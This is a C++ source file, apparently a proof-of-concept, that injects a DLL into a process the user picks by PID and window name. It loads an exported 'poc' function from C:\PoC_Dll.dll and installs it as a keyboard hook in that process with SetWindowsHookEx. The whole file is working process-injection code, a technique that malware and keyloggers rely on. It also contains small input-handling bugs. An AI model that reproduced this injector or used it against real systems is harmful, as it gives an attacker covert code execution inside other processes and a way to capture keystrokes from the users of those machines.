// DLLInjection-SetWindowsHookEx.cpp : This file contains the 'main' function. Program execution begins and ends there.
//


#include "pch.h"
#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

DWORD getThreadID(DWORD pid)
{
	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (h != INVALID_HANDLE_VALUE)
	{
		THREADENTRY32 te;
		te.dwSize = sizeof(te);
		if (Thread32First(h, &te))
		{
			do
			{
				if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID))
				{
					if (te.th32OwnerProcessID == pid)
					{
						HANDLE hThread = OpenThread(READ_CONTROL, FALSE, te.th32ThreadID);
						if (!hThread)
							printf(TEXT("[-] Error: Couldn't get thread handle\n"));
						else
							return te.th32ThreadID;
					}
				}
			} while (Thread32Next(h, &te));
		}
	}

	CloseHandle(h);
	return (DWORD)0;
}

int injectIntoPID(int process, char *strProcName)
{
	DWORD dwProcessId = (DWORD)process;
	const char* dllfile = "C:\\PoC_Dll.dll";
	PCWSTR pszLibFile = L"C:\\PoC_Dll.dll";
	DWORD dwThreadId = getThreadID(dwProcessId);
	if (dwThreadId == (DWORD)0)
	{
		printf(TEXT("[-] Error: Cannot find thread"));
		return(1);
	}

#ifdef _DEBUG
	printf(TEXT("[+] Using Thread ID %u\n"), dwThreadId);
#endif
	LPCTSTR file = dllfile;

	HMODULE dll = LoadLibraryEx(file, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (dll == NULL)
	{
		printf(TEXT("[-] Error: The DLL could not be found.\n"));
		return(1);
	}

	// Your DLL needs to export the 'poc' function
	HOOKPROC addr = (HOOKPROC)GetProcAddress(dll, "poc");
	if (addr == NULL)
	{
		printf(TEXT("[-] Error: The DLL exported function was not found.\n"));
		return(1);
	}

	HWND targetWnd = FindWindow(NULL, strProcName);
	GetWindowThreadProcessId(targetWnd, &dwProcessId);

	HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, addr, dll, dwThreadId);
	if (handle == NULL)
	{
		printf(TEXT("[-] Error: The KEYBOARD could not be hooked.\n"));
		return(1);
	}
	else
	{
		printf(TEXT("[+] Program successfully hooked.\nPress enter to unhook the function and stop the program.\n"));
		getchar();
		UnhookWindowsHookEx(handle);
	}

	return(0);
}

int main(int argc, char* argv)
{
	int pid; char *pname;
	puts("Inject into which PID: ");
	scanf_s("%u", &pid);
	puts("Inject into which process: ");
	scanf_s("%s", &pname);
	// wprintf(pname);
	puts("Method used to attach thread is : SetWindowsHookEx");
	int result = injectIntoPID(pid, pname);
	if (result == -1)
	{
		puts("Could not inject into PID");
	}
	system("pause");
}
